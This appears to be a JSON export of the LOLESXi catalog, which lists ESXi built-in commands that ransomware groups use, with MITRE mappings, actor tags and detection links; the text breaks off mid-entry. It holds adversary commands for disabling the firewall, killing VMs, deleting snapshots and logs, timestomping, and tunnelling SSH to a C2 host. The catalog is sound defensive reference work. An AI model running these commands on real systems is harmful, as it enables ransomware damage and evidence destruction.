[{"Name":"chmod","Description":"An inbuilt utility that allows user's to change file and folder permissions.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"chmod a+x /tmp/<FILENAME>","Description":"Change Execution Permission of a file.","Usecase":"An adversary modifies permissions of a file. For e.g. The execution flag is set on a ransomware payload prior to deployment.","Category":"Change File Permission","Privileges":"User","MitreID":"T1222.002","OperatingSystem":"ESXi","ProceduralExamples":["/bin/chmod a+w /usr/lib/vmware/hostd/docroot/index.html 2>1 >/dev/null","/bin/chmod a+w /usr/lib/vmware/hostd/docroot/ui/index.html 2>1 >/dev/null"],"Tags":[{"E-Crime":"Cyborg Spider"},{"E-Crime":"Pysa"}]},{"Command":"/bin/chmod +w /var/spool/cron/crontabs/root","Description":"Making a file writeable.","Usecase":"An adversary alters a file's permissions to allow write access. Once the file has been modified, they may revert it to more restrictive permissions to prevent it being edited by other users.","Category":"Change File Permission","Privileges":"User","MitreID":"T1222.002","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Nevada"},{"E-Crime":"Kraken"}],"ProceduralExamples":["/bin/chmod -w /var/spool/cron/crontabs/root","chmod +x $CLEAN_DIR/encrypt","chmod +x ./encryptor[.]elf && ./encryptor[.]elf –path  -d -timeout"]}],"Full_Path":[{"Path":"/bin/chmod"},{"Path":"/sbin/chmod"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/"},{"Link":"https://www.reddit.com/r/esxi/comments/10txpje/i_was_attack_by_esxi_ransomware_and_the_attack/"},{"Link":"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire"},{"Link":"https://www.hybrid-analysis.com/sample/be5d2e94c2498ec052fb025e3348085e418c856dd43080501acfe2067ba54c41/6553b8f44c06e50d5408581f"},{"Link":"https://blog.talosintelligence.com/kraken-ransomware-group/"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/chmod/"},{"Name":"df","Description":"Provides disk utilisation statistics of attached volumes.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-31","Commands":[{"Command":"df -h -P -x\"squashfs\" | awk '{print $1\"\\t\"$2\"\\t\"$3\"\\t\"$4\"\\t\"$5\"\\t\"$6}'","Description":"Displays information regarding available storage on a ESXi host","Usecase":"An adversary may obtain information about existing storage availability to plan subsequent operations. Above command provides outputs available disk space in human readable format in POSIX format. It excludes the squashfs and then prints the first 6 columns from the output. Note that the -P and -x switches are not available in ESXi so the exact command may not get executed successfully.","Category":"System Information","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi","Tags":[{"E-Crime":"RansomHouse"}]}],"Full_Path":[{"Path":"/bin/df"},{"Path":"/sbin/df"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/df/"},{"Name":"esxcfg-advcfg","Description":"A command-line utility available in VMware ESXi to manage advanced configuration settings. It allows administrators to query, modify, and manage various advanced parameters that are not typically available through the standard vSphere Client or the ESXi host client interface.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-31","Commands":[{"Command":"esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity","Description":"Increases the number of buffers to increase VM performance over network.","Usecase":"An adversary may adjust the maximum capacity of buffer cache to increase performance of operations conducted over the network.","Category":"Adjust Performance","Privileges":"Administrator","OperatingSystem":"ESXi < 8.0","Tags":[{"E-Crime":"Qilin"}]},{"Command":"esxcfg-advcfg -s 20000 /BufferCache/FlushInterval","Description":"Reduces the Buffer Cache Flush interval to increase VM performance over network.","Usecase":"An adversary may adjust flush interval of buffer cache to increase performance of operations conducted over the network.","Category":"Adjust Performance","Privileges":"Administrator","OperatingSystem":"ESXi < 8.0","Tags":[{"E-Crime":"Qilin"}]}],"Full_Path":[{"Path":"/bin/esxcfg-advcfg"},{"Path":"/sbin/esxcfg-advcfg"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/"},{"Link":"https://knowledge.broadcom.com/external/article?legacyId=2052302"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/esxcfg-advcfg/"},{"Name":"esxcli","Description":"esxcli is a command-line interface (CLI) tool (which is a python script) used to manage VMware ESXi hosts. Using esxcli, administrators can perform various tasks related to ESXi host management, including network configuration, storage management, and VM operations.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"esxcli --formatter=csv --format-param=fields==\"WorldID,DisplayName\" vm process list","Description":"Provides a CSV output of running Virtual Machines with its corresponding WorldID and DisplayName.","Usecase":"Provides a list of running Virtual Machines with their WorldID and Displayname in CSV format","Category":"Lists VMs","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi","ProceduralExamples":["esxcli --formatter=csv vm process list","/bin/sh -c esxcli vm process list > list","esxcli vm process list"]},{"Command":"esxcli vm process kill --type=force --world-id=796791","Description":"Terminates a Virtual Machine using its World ID.","Usecase":"Force terminates a VM using the WorldID when Soft or Hard terminates options fail. Soft termination allows the guest OS to gracefully shut down.This is similar to kill-SIGTERM. Gard mode immediately terminates a Virtual Machine using its World ID. It kills the VMX process and is similar to a kill -9 command","Category":"terminate vm","Privileges":"Administrator","MitreID":"T1489","OperatingSystem":"ESXi","ProceduralExamples":["esxcli vm process kill –type=hard –world-id=<ID>","esxcli vm process kill -w <WID> -t soft","esxcli --formatter=csv --format-param=fields==\"WorldID,DisplayName\" vm process list | awk -F \"\\\"*,\\\"*\" '{system(\"esxcli vm process kill --type=force --world-id=\" $1)}'","For i in ‘esxcli VM Process List | grep “World ID” | awk ‘{print $3}”; do esxcli vm process kill -t=force -w=$i;done;","esxcli vm process kill --type=force"]},{"Command":"esxcli system version get","Description":"Display the product name, version and build information.","Usecase":"An adversary may use this to obtain the exact build version information of the ESXi host to facilitate subsequent actions.","Category":"system information","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi"},{"Command":"esxcli system hostname get","Description":"Shows FQDN of the ESXi host.","Usecase":"FQDN of the host can be used as part of infrastructure information gathering operations.","Category":"system information","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi"},{"Command":"esxcli system account list","Description":"Displays a list of local accounts in the ESXi host.","Usecase":"An adversary may use the list of local accounts and use them for subsequent opeations. CSV output option was selected in certain operations.","Category":"account enumeration","Privileges":"Administrator","MitreID":"T1087.001","OperatingSystem":"ESXi","ProceduralExamples":["esxcli --formatter=csv system account list"]},{"Command":"esxcli storage filesystem list","Description":"Shows all the volumes available on the ESXi host.","Usecase":"An adversary may use this command to gain visibility of different volumes attached to the ESXi host. An adversary may use this command to gain visibility of different volumes attached to the ESXi host within /vmfs/volumes folder. This location usually holds data related to VMs.","Category":"discover storage","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi","ProceduralExamples":["esxcli storage filesystem list | grep \"/vmfs/volumes/\" | awk -F'  ' '{print $2}'"]},{"Command":"/bin/sh -c \"esxcli system welcomemsg set -m=\"\"","Description":"Changes the ESXi Welcome Message on the Direct Console User Interface (DCUI).","Usecase":"An adversary changes the welcome message on the DCUI with ransomware notification.","Category":"change display information","Privileges":"Administrator","MitreID":"T1491.001","OperatingSystem":"ESXi"},{"Command":"esxcli network firewall set --enabled false","Description":"Disables the ESXi firewall.","Usecase":"An adversary changes the ESXi host based firewall so it will cause minimum interference with their operations.","Category":"disable service","Privileges":"Administrator","MitreID":"T1562.004","OperatingSystem":"ESXi"},{"Command":"esxcli network firewall set --default-action true","Description":"Changes the ESXi firewall default action to PASS. Command is inferred based on vendor documentation, not available via CTI.","Usecase":"An adversary sets the default firewall action to allow all incoming and outgoing traffic.","Category":"modify service","Privileges":"Administrator","MitreID":"T1562.004","OperatingSystem":"ESXi","ProceduralExamples":["esxcli network firewall set -d true"]},{"Command":"esxcli vsan debug vmdk list","Description":"List the status of VMDKs in vSAN.","Usecase":"An adversary carries out enumeration of storage.","Category":"discover storage","Privileges":"Administrator","MitreID":null,"OperatingSystem":"ESXi"},{"Command":"esxcli --format-param=fields==\"Type,ObjectUUID,Configuration\" vsan debug object list","Description":"List the UUID of the vSAN objects.","Usecase":"An adversary carries out enumeration of storage objects.","Category":"discover storage","Privileges":"Administrator","MitreID":null,"OperatingSystem":"ESXi"},{"Command":"esxcli --formatter=csv --format-param=fields==\"Device,DevfsPath\" storage core device list","Description":"List the Devfs Path of the devices currently registered with the storage.","Usecase":"An adversary carries out enumeration of devices connected to storage.","Category":"discover storage","Privileges":"Administrator","MitreID":null,"OperatingSystem":"ESXi"},{"Command":"esxcli --formatter=csv network ip interface ipv4 get","Description":"Displays network interface details.","Usecase":"An adversary may obtain information regarding network interfaces available in the ESXi host.","Category":"discover network info","Privileges":"Administrator","MitreID":null,"OperatingSystem":"ESXi","ProceduralExamples":["esxcli --formatter=csv network ip interface ipv4 get"]},{"Command":"esxcli software vib install -f --no-sig-check","Description":"Install a VIB without checking the signature.","Usecase":"To bypass additional validation when installing malicious VIBs, an adversary uses the force and no signature checking switches. Malicious VIBs are used to maintain persistent and command execution capability with an ESXi host and its guest VMs.","Category":"software operation","Privileges":"Administrator","MitreID":null,"OperatingSystem":"ESXi"},{"Command":"esxcli software acceptance set --level CommunitySupported","Description":"Changes the VIB acceptance level to CommunitySupported.","Usecase":"ESXi by default will require it to be signed and by default set to PartnerSupported level. An adversary may change the VIB acceptance level to CommunitySupported level prior to running VIB installation.","Category":"software operation","Privileges":"Administrator","MitreID":null,"OperatingSystem":"ESXi"},{"Command":"esxcli system syslog config set --logdir=/tmp","Description":"Changes the syslog directory using esxcli. This is followed by the command esxcli system syslog reload","Usecase":"An adversary may change the default directory where syslog log files are written to evade detection.","Category":"modify logging","Privileges":"Administrator","MitreID":"T1562.012","OperatingSystem":"ESXi","ProceduralExamples":["/bin/sh -c 'esxcli system syslog config set --logdir=/tmp'"]},{"Command":"esxcli system coredump file set --unconfigure","Description":"Disable creation of coredumps in ESXi","Usecase":"An adversary may disable coredump creation to prevent diagnostic data from being generated. This is to prevent traces of their activity from being available for inspection during investigations.","Category":"modify service","Privileges":"Administrator","MitreID":"T1562.001","OperatingSystem":"ESXi","ProceduralExamples":["/bin/sh -c 'esxcli system coredump file set --unconfigure'"],"Tags":[{"E-Crime":"PINCHY SPIDER"},{"E-Crime":"REvix"},{"E-Crime":"Rhysida"},{"E-Crime":"VIKING SPIDER"},{"E-Crime":"Ragnar Locker"},{"E-Crime":"RansomHouse"},{"E-Crime":"Darkside"},{"E-Crime":"Qilin"},{"E-Crime":"Blacksuit"},{"E-Crime":"ESXiArgs"},{"E-Crime":"Nevada"},{"E-Crime":"Blackcat"},{"E-Crime":"Royal Ransomware"},{"E-Crime":"Lockbit"},{"E-Crime":"Revil"},{"E-Crime":"Howling Scorpius"},{"E-Crime":"Helldown"},{"E-Crime":"Kraken"},{"APT":"UNC3886"}]}],"Full_Path":[{"Path":"/bin/esxcli"},{"Path":"/sbin/esxcli"}],"Detection":[{"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_system_discovery.yml"},{"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_kill.yml"},{"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vsan_discovery.yml"},{"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_discovery.yml"},{"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_storage_discovery.yml"},{"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_network_discovery.yml"},{"Elastic":"https://github.com/elastic/detection-rules/blob/main/rules/linux/impact_esxi_process_kill.toml"}],"AtomicTests":["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-31---esxi---vm-discovery-using-esxcli","https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-32---esxi---darkside-system-information-discovery","https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1129/T1129.md#atomic-test-1---esxi---install-a-custom-vib-on-an-esxi-host","https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md#atomic-test-14---esxi---avoslocker-enumerates-vms-and-forcefully-kills-vms","https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.010/T1562.010.md#atomic-test-2---esxi---change-vib-acceptance-level-to-communitysupported-via-esxcli","https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.010/T1562.010.md#atomic-test-1---esxi---change-vib-acceptance-level-to-communitysupported-via-powercli"],"Resources":[{"Link":"https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/"},{"Link":"https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html"},{"Link":"https://www.fortinet.com/blog/threat-research/royal-ransomware-targets-linux-esxi-servers"},{"Link":"https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware"},{"Link":"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire"},{"Link":"https://cloudsek.com/blog/analysis-of-files-used-in-esxiargs-ransomware-attack-against-vmware-esxi-servers"},{"Link":"https://gist.githubusercontent.com/manualbashing/4955642aa81d74c3c5221a698abfe381/raw/2e7ad84449c875821b31455ae1f4193bfde8b05f/freqStunnedVMs.sh"},{"Link":"https://www.trendmicro.com/vinfo/au/threat-encyclopedia/malware/ransom.linux.blacksuit.theodbc"},{"Link":"https://vdc-repo.vmware.com/vmwb-repository/dcr-public/24be7af7-d9cd-48d9-bab8-8c91614be19d/0ca33108-8017-4b40-86b9-f066456894ea/doc/GUID-53C7D50E-1C8D-486D-89FF-E69B0A77E406.html"},{"Link":"https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/"},{"Link":"https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/"},{"Link":"https://www.trendmicro.com/en_us/research/21/e/darkside-linux-vms-targeted.html"},{"Link":"https://x.com/malwrhunterteam/status/1704974867542532286/photo/3"},{"Link":"https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass"},{"Link":"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence"},{"Link":"https://blogs.vmware.com/vsphere/2011/09/whats-in-a-vib.html"},{"Link":"https://www.hybrid-analysis.com/sample/be5d2e94c2498ec052fb025e3348085e418c856dd43080501acfe2067ba54c41/6553b8f44c06e50d5408581f"},{"Link":"https://www.forescout.com/resources/rise-in-linux-ransomware/"},{"Link":"https://www.reversinglabs.com/blog/gwisinlocker-ransomware-targets-south-korean-industrial-and-pharmaceutical-companies"},{"Link":"https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/"},{"Link":"https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening"},{"Link":"https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/"},{"Link":"https://labs.yarix.com/2025/01/zyxel-vulnerability-exploited-by-helldown-ransomware-group/"},{"Link":"https://blog.talosintelligence.com/kraken-ransomware-group/"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/esxcli/"},{"Name":"find","Description":"A commandline utility that can be used to locate files and directories based on various criteria, such as name, type, size, modification date, etc.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"find /vmfs/volumes/ -type f -name \"*.vmdk\"","Description":"Locates files with extensions commonly associated with Virtual Machines, such as .vmdk and .vmx within /vmfs/volumes folder path. This may be performed programmatically and additional switches can be used to exclude specific folders from the search.","Usecase":"Locate virtual machine disks in preparation for encryption operations or for exfiltration.","Category":"Find Files","Privileges":"Administrator","MitreID":"T1083","OperatingSystem":"ESXi","ProceduralExamples":"- find \"/vmfs/volumes/$volume/\" -type f -name \"*.vmdk\" -o -name \"*.vmx\" -o -name \"*.vmxf\" -o -name \"*.vmsd\" -o -name \"*.vmsn\" -o -name \"*.vswp\" -o -name \"*.vmss\" -o -name \"*.nvram\" -o -name \"*.vmem\"\n- find /vmfs/volumes/ -type f -not \\( -path /sys -prune \\) -not \\( -path /proc -prune \\) \n -not \\( -path /run -prune \\) -not \\( -path /var/log -prune \\) -name \"*.vmdk*\" -o -name \"*.ovf*\" -o -name \"*.ova*\" -o -name \"*.vmem*\" -o -name \"*.vswp*\" -o -name \"*.vmsd*\" -o -name \"*.vmsn*\" -o -name \"*.vib*\" -o -name \"*.vbk*\" -o -name \"*.vbm*\"\n"},{"Command":"/bin/find / -name *.log -exec /bin/rm -rf {} \\;","Description":"Find and delete all files ending with .log extension","Usecase":"An adversary deletes all files ending with the .log file extension to clear evidence of their offensive operations.","Category":"Remove Evidence","Privileges":"User","MitreID":"T1070.004","OperatingSystem":"ESXi","ProceduralExamples":["/bin/find / -name *.log -exec /bin/rm -rf {} \\;"]},{"Command":"find /usr/lib/vmware -type f -name index.html","Description":"Find and replace the ESXi web console homepage.","Usecase":"An adversary finds and replaces the ESXi web console homepage with a custom version. This often contains ransomware notification message.","Category":"Find and Replace","Privileges":"User","MitreID":"T1491.001","OperatingSystem":"ESXi","Tags":[{"E-Crime":"RansomHouse"},{"E-Crime":"Nevada"}],"ProceduralExamples":"- find /usr/lib/vmware -type f -name index.html\nmv \"$path_to_ui/index.html\" \"$path_to_ui/index1.html\ncp \"$CLEAN_DIR/index.html\" \"$path_to_ui/index.html\" \n"}],"Full_Path":[{"Path":"/usr/lib/vmware/busybox/bin/busybox find"},{"Path":"/sbin/find"},{"Path":"/bin/find"}],"Detection":[{"Elastic":"https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_rename_esxi_index_file.toml"}],"AtomicTests":["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md#atomic-test-7---esxi---enumerate-vmdks-available-on-an-esxi-host"],"Resources":[{"Link":"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire"},{"Link":"https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/find/"},{"Name":"kill","Description":"Allows manual termination of processes of interest.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"kill -9 {process}","Description":"Terminates processes on an ESXi Host","Usecase":"An adversary may list processes starting with vmx and then extracts the second column from the output and uses it to terminate the process. Further, research indicates that adversaries enumerate ssh sessions by non-root users and sends a kill signal 9 to terminate them. This ceases ssh sessions initiated by legitimate users and allows the adversary to operate further using root user account.","Category":"Terminate Process","Privileges":"Administrator","MitreID":"T1489","OperatingSystem":"ESXi","Tags":[{"E-Crime":"RansomHouse"},{"E-Crime":"Nevada"}],"ProceduralExamples":["kill -9 $(ps | grep vmx | awk '{print $2}')","ps | grep sshd | grep -v -e grep -e root -e 12345 | awk {print \"kill -9\", $2} | sh"]}],"Full_Path":[{"Path":"/usr/lib/vmware/busybox/bin/busybox kill"},{"Path":"/sbin/kill"},{"Path":"/bin/kill"}],"Detection":[{"Sigma":"https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_kill.yml"}],"AtomicTests":null,"Resources":[{"Link":"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire"},{"Link":"https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/kill/"},{"Name":"mv","Description":"Used for moving or renaming files/folders within a file system.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"mv /etc/motd /etc/motd1","Description":"Renames the Message Of The Day file.","Usecase":"An adversary renames the current motd file on an ESXi host and copies a custom version to its location. This usually contain the ransom notification.","ProcedureExamples":["mv /etc/motd /etc/motd1 && cp $CLEAN_DIR/motd /etc/motd"],"Category":"Replace File","Privileges":"Administrator","MitreID":"T1491","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Nevada"}]}],"Full_Path":[{"Path":"/usr/lib/vmware/busybox/bin/busybox mv"},{"Path":"/sbin/mv"},{"Path":"/bin/mv"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/mv/"},{"Name":"pkill","Description":"Forcefully terminates processes by performing a full or partial match based on the process name. It is commonly exploited by adversaries to abruptly stop running Virtual Machine (VM) executable processes. This is usually performed prior to ransomware deployment.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"pkill -9 %s","Description":"Terminates all processes starts with the vmx- prefix.","Usecase":"Forceful termination of Virtual Machines","Category":"terminate process","Privileges":"Administrator","MitreID":"T1489","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Revil"}],"ProceduralExamples":["pkill -9 vmx-*"]}],"Full_Path":[{"Path":"/bin/vmkvsitools pkill"},{"Path":"/sbin/pkill"},{"Path":"/bin/pkill"}],"Detection":null,"AtomicTests":["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md#atomic-test-13---esxi---terminates-vms-using-pkill"],"Resources":[{"Link":"https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/"},{"Link":"https://www.forescout.com/resources/rise-in-linux-ransomware/"},{"Link":"https://www.hybrid-analysis.com/sample/ea1872b2835128e3cb49a0bc27e4727ca33c4e6eba1e80422db19b505f965bc4/60db1f3adc8afe020254a5f3"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/pkill/"},{"Name":"ps","Description":"List process information from an ESXi host.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2026-02-02","Commands":[{"Command":"ps | grep vmx | grep \"%s\" | grep -v grep | awk '{print $2}' | sort -u","Description":"Gets a list of VM guest processes.","Usecase":"An adversary obtains list of all running processes and filters it to only get those related to guest VMs.","Category":"Lists VMs","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Lockbit"}]}],"Full_Path":[{"Path":"/sbin/ps"},{"Path":"/bin/ps"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.levelblue.com/blogs/spiderlabs-blog/19-shades-of-lockbit5.0-inside-the-latest-cross-platform-ransomware-part-1"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/ps/"},{"Name":"rm","Description":"Used to delete files or directories from an ESXi file system.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2025-11-16","Commands":[{"Command":"rm -f \"/path/to/directory/*\"","Description":"Force deletes files from a directory.","Usecase":"An adversary deletes logs from an ESXi host to clear traces of their operations.","Category":"Delete file","Privileges":"Administrator","MitreID":"T1070.004","OperatingSystem":"ESXi","ProceduralExamples":"- rm -f \"/var/logs/*\"\n- rm -f \"/.ash_history\"\n"}],"Full_Path":[{"Path":"/sbin/rm"},{"Path":"/bin/rm"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://blog.talosintelligence.com/kraken-ransomware-group/"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/rm/"},{"Name":"ssh","Description":"Inbuilt SSH client used to remote port-forward using a tunnel.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2025-01-24","Commands":[{"Command":"ssh –fN -R 127.0.0.1:<SOCKS port> <user>@<C2 IP address>","Description":"SSH client used to create a tunnel.","Usecase":"An adversary uses the native SSH binary to create a tunnel to remote port-forwarding to their C2 host.","Category":"Tunnel Traffic","Privileges":"User","MitreID":"T1572","OperatingSystem":"ESXi","ProceduralExamples":["ssh –fN -R 127.0.0.1:<SOCKS port> <user>@<C2 IP address>"]}],"Full_Path":[{"Path":"/bin/ssh"},{"Path":"/sbin/ssh"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.sygnia.co/blog/esxi-ransomware-ssh-tunneling-defense-strategies/"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/ssh/"},{"Name":"systemctl","Description":"Manages the status of system services","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"service $s stop","Description":"Stops all services on an ESXi host.","Usecase":"An adversary stops all services within the ESXi host to prevent any interference with ransomware encryption operations.","Category":"Stop Service","Privileges":"Administrator","MitreID":"T1529","OperatingSystem":"ESXi","Tags":[{"E-Crime":"GwisinLocker"}],"ProceduralExamples":["/usr/local/etc/r/etc/init.d/%s* systemctl stop %/sbin/service %s/bin/sh -c \"for s in `service -l | grep %s`; do service $s stop;"]}],"Full_Path":[{"Path":"/sbin/services.sh"}],"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.hybrid-analysis.com/sample/7594bf1d87d35b489545e283ef1785bb2e04637cc1ff1aca9b666dde70528e2b/6310d9bdbde3430a5a65372f"},{"Link":"https://www.reversinglabs.com/blog/gwisinlocker-ransomware-targets-south-korean-industrial-and-pharmaceutical-companies"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/systemctl/"},{"Name":"touch","Description":"Primarily used to create an empty file or to update the timestamp (modification and access time) of an existing file without changing its content.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"/bin/touch -r /etc/vmware/rhttpproxy/config.xml /etc/rc.local.d/local.sh","Description":"Changes modification or access timestamps of a target file based on a reference file.","Usecase":"An adversary uses the modification and access timestamps of a references file and updates the same timestampts of a target file. This is to hinder analysis based on timestamps as the malicious file match the timestamps of a legitimate file.","Category":"Timestomp","Privileges":"Administrator","MitreID":"T1070.006","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Nevada"}],"ProceduralExamples":["/bin/touch -r /etc/vmware/rhttpproxy/config.xml /etc/vmware/rhttpproxy/endpoints.conf","/bin/touch -r /usr/lib/vmware/busybox/bin/busybox /var/spool/cron/crontabs/root","/bin/touch -r /usr/lib/vmware/busybox/bin/busybox /bin/hostd-probe.sh"]}],"Full_Path":[{"Path":"/sbin/touch"},{"Path":"/bin/touch"},{"Path":"/usr/lib/vmware/busybox/bin/busybox touch"}],"Detection":[{"Elastic":"https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_esxi_suspicious_timestomp_touch.toml"}],"AtomicTests":null,"Resources":[{"Link":"https://www.reddit.com/r/esxi/comments/10txpje/i_was_attack_by_esxi_ransomware_and_the_attack/"},{"Link":"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/touch/"},{"Name":"ulimit","Description":"A command line utility used to control the resource limits available to the shell and processes started by it. These limits are designed to prevent a single user or process from using high number of system resources, which could negatively impact the entire system.","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"ulimit -p $(ulimit -Hp) ulimit -n $(ulimit -Hn)","Description":"Changes the open file descriptor and pseudoterminals to unlimited.","Usecase":"An adversary modifies the resource limit thresholds to unlimited. This allows a single process to utilise all the system resources.","Category":"Adjust Performance","Privileges":"Administrator","OperatingSystem":"ESXi","Tags":[{"E-Crime":"Nevada"}]}],"Full_Path":null,"Detection":null,"AtomicTests":null,"Resources":[{"Link":"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire"}],"url":"https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/ulimit/"},{"Name":"vim-cmd","Description":"A command-line utility in VMware ESXi that provides an interface to interact with the VMware Infrastructure (VI) API, allowing users to manage and automate tasks on ESXi host and its virtual machines (VMs)","Author":"Janantha Marasinghe @blueteam0ps_","Created":"2024-08-27","Commands":[{"Command":"vim-cmd hostsvc/enable_ssh","Description":"Enables SSH services on the ESXi host","Usecase":"SSH service enables adversaries to laterally move to ESXi hosts and use as an alternative command execution interface.","Category":"Enable Service","Privileges":"Administrator","MitreID":"T1021.004","OperatingSystem":"ESXi"},{"Command":"vim-cmd hostsvc/autostartmanager/enable_autostart false","Description":"Disable autostart of Virtual Machines","Usecase":"Disabling autostart of Virtual Machines prevents them from starting post reboot of a ESXi host.","Category":"Disable Startup","Privileges":"Administrator","MitreID":"T1529","OperatingSystem":"ESXi","ProceduralExamples":["vim-cmd hostsvc/autostartmanager/enable_autostart 0"]},{"Command":"vim-cmd hostsvc/hostsummary | grep cpuModel","Description":"Displays summary of system information about the ESXi host","Usecase":"Shows the exact cpuModel from the hostsummary output","Category":"System Information","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi"},{"Command":"vim-cmd vmsvc/getallvms","Description":"Displays the list of VMs available on an ESXi host.","Usecase":"Shows running VMs on an ESXi Host. Adversaries were seen use this techinique to programatically enumerate VMs and powers them down using the Vmid.","Category":"System Information","Privileges":"Administrator","MitreID":"T1082","OperatingSystem":"ESXi","ProceduralExamples":["/bin/sh -c “for vmid in $(vim-cmd vmsvc/getallvms | grep -v Vmid | awk '{print $1}'); do vim-cmd vmsvc/power.off $vmid; done\"","for i in $(vim-cmd vmsvc/getallvms | awk '{print $1}' | grep -Eo '[0-9]{1,5}'); do vim-cmd vmsvc/power.off $i; vim-cmd vmsvc/snapshot.removeall $i; done;","vim-cmd 